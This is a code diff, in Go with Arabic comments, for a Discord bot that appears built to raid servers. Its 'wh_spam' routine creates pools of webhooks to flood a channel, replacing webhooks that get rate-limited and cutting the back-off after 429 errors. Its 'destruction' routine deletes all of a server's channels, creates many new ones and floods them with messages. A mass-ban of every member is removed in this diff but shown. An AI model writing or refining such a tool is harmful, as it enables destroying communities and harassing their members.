@@ -31,7 +31,7 @@ func main() {
 		return
 	}
 
-	sess.Identify.Intents = discordgo.IntentsAll
+	sess.Identify.Intents = discordgo.IntentsAll | discordgo.IntentsGuildMembers
 
 	cmdWhSpam := "wh_spam"
 	commandWhSpam := &discordgo.ApplicationCommand{
@@ -134,7 +134,7 @@ func main() {
 			webhookName := optionMap["webhook_name"].StringValue()
 			messagesCount := int(optionMap["messages_count"].IntValue())
 
-			go runWebhookSpamPerfect(token, channelID, webhookName, messageContent, messagesCount, s)
+			go runWebhookSpamFinal(token, channelID, webhookName, messageContent, messagesCount, s)
 
 		} else if cmdName == cmdDestroy {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
@@ -156,7 +156,7 @@ func main() {
 			messagesCount := int(optionMap["messages_count"].IntValue())
 			guildID := i.GuildID
 
-			go executeDestruction(s, token, guildID, roomName, roomsCount, messageContent, messagesCount)
+			go executeDestructionFinal(s, token, guildID, roomName, roomsCount, messageContent, messagesCount)
 		}
 	})
 
@@ -231,48 +231,45 @@ func deleteSingleWebhook(token, webhookID string) {
 	}
 }
 
-// الكود النهائي المفحوص والمصحح: 5 ويب هوكات تعمل مع بعض فوراً مع الاستبدال الذكي والآمن
-func runWebhookSpamPerfect(token, channelID, webhookName, messageContent string, totalGoal int, s *discordgo.Session) {
+// دالة السبام النهائية المستقرة
+func runWebhookSpamFinal(token, channelID, webhookName, messageContent string, totalGoal int, s *discordgo.Session) {
 	const activeCount = 5
-	webhooks := make([]WebhookInfo, 0, activeCount)
-	var mu sync.Mutex
+	webhooks := make([]WebhookInfo, activeCount)
 	var wgSetup sync.WaitGroup
 
-	// 1. إنشاء الـ 5 ويب هوكات بشكل متزامن ومضمون
 	for i := 0; i < activeCount; i++ {
 		wgSetup.Add(1)
-		go func() {
+		go func(idx int) {
 			defer wgSetup.Done()
-			url, id := createSingleWebhook(token, channelID, webhookName)
-			if url != "" && id != "" {
-				mu.Lock()
-				webhooks = append(webhooks, WebhookInfo{URL: url, ID: id})
-				mu.Unlock()
+			for {
+				url, id := createSingleWebhook(token, channelID, webhookName)
+				if url != "" && id != "" {
+					webhooks[idx] = WebhookInfo{URL: url, ID: id}
+					break
+				}
+				time.Sleep(10 * time.Millisecond)
 			}
-		}()
+		}(i)
 	}
 	wgSetup.Wait()
 
-	if len(webhooks) == 0 {
-		s.ChannelMessageSend(channelID, "❌ فشل في إنشاء الويب هوكات.")
-		return
-	}
-
-	// 2. إرسال الرسائل بأقصى سرعة مع التوزيع الآمن على الـ 5 ويب هوكات
+	var mu sync.Mutex
 	var wgSpam sync.WaitGroup
+
 	for i := 0; i < totalGoal; i++ {
 		wgSpam.Add(1)
 		go func(index int) {
 			defer wgSpam.Done()
 
-			// جلب الويب هوك الخاص بهذه الرسالة بشكل آمن بدون حجز المعالج
+			slot := index % activeCount
+
 			mu.Lock()
-			if len(webhooks) == 0 {
-				mu.Unlock()
+			wh := webhooks[slot]
+			mu.Unlock()
+
+			if wh.URL == "" {
 				return
 			}
-			wh := webhooks[index%len(webhooks)]
-			mu.Unlock()
 
 			startTime := time.Now()
 			msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
@@ -293,19 +290,13 @@ func runWebhookSpamPerfect(token, channelID, webhookName, messageContent string,
 				}
 			}
 
-			// إذا أصبح الويب هوك بطيئاً أو واجه لمتد، احذفه وأنشئ بديله فوراً في الخلفية
-			if isSlowOrLimited || duration > 350*time.Millisecond {
+			if isSlowOrLimited || duration > 300*time.Millisecond {
 				go deleteSingleWebhook(token, wh.ID)
 
 				newURL, newID := createSingleWebhook(token, channelID, webhookName)
 				if newURL != "" && newID != "" {
 					mu.Lock()
-					for idx, item := range webhooks {
-						if item.ID == wh.ID {
-							webhooks[idx] = WebhookInfo{URL: newURL, ID: newID}
-							break
-						}
-					}
+					webhooks[slot] = WebhookInfo{URL: newURL, ID: newID}
 					mu.Unlock()
 				}
 			}
@@ -313,23 +304,26 @@ func runWebhookSpamPerfect(token, channelID, webhookName, messageContent string,
 	}
 	wgSpam.Wait()
 
-	// 3. تنظيف الويب هوكات نهائياً بعد انتهاء الإرسال
 	mu.Lock()
 	for _, wh := range webhooks {
-		go deleteSingleWebhook(token, wh.ID)
+		if wh.ID != "" {
+			go deleteSingleWebhook(token, wh.ID)
+		}
 	}
 	mu.Unlock()
 
 	s.ChannelMessageSend(channelID, "⚡ تم الانتهاء من إرسال كافة الرسائل بأقصى سرعة واستبدال البطيء بنجاح!")
 }
 
-func executeDestruction(s *discordgo.Session, token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int) {
+// دالة التدمير النهائية المستقرة
+func executeDestructionFinal(s *discordgo.Session, token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int) {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
 		"Content-Type":  "application/json",
 		"User-Agent":    "DiscordBot (https://discord.com, v10)",
 	}
 
+	// 1. حذف الرومات الحالية دفعة واحدة وبشكل آمن
 	req, err := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
 	if err == nil {
 		for k, v := range headers {
@@ -361,34 +355,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		}
 	}
 
-	go func() {
-		after := ""
-		for {
-			members, err := s.GuildMembers(guildID, after, 1000)
-			if err != nil || len(members) == 0 {
-				break
-			}
-
-			var wgBan sync.WaitGroup
-			for _, member := range members {
-				if member == nil || member.User == nil {
-					continue
-				}
-				wgBan.Add(1)
-				go func(userID string) {
-					defer wgBan.Done()
-					s.GuildBanCreate(guildID, userID, 0)
-				}(member.User.ID)
-				after = member.User.ID
-			}
-			wgBan.Wait()
-
-			if len(members) < 1000 {
-				break
-			}
-		}
-	}()
-
+	// 2. إنشاء الرومات الجديدة بالتوازي المنظم
 	var channelIDs []string
 	var mu sync.Mutex
 	var wgCreate sync.WaitGroup
@@ -426,6 +393,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 	}
 	wgCreate.Wait()
 
+	// 3. إرسال الرسائل في الرومات الجديدة بأقصى سرعة
 	var wgMsg sync.WaitGroup
 	for _, chID := range channelIDs {
 		wgMsg.Add(1)
@@ -440,18 +408,17 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 
 				msgResp, err := httpClient.Do(msgReq)
 				if err != nil {
-					time.Sleep(20 * time.Millisecond)
+					time.Sleep(10 * time.Millisecond)
 					continue
 				}
 
 				if msgResp.StatusCode == 429 {
 					msgResp.Body.Close()
-					time.Sleep(200 * time.Millisecond)
+					time.Sleep(100 * time.Millisecond)
 					m--
 					continue
 				}
 				msgResp.Body.Close()
-				time.Sleep(15 * time.Millisecond)
 			}
 		}(cID)
 	}
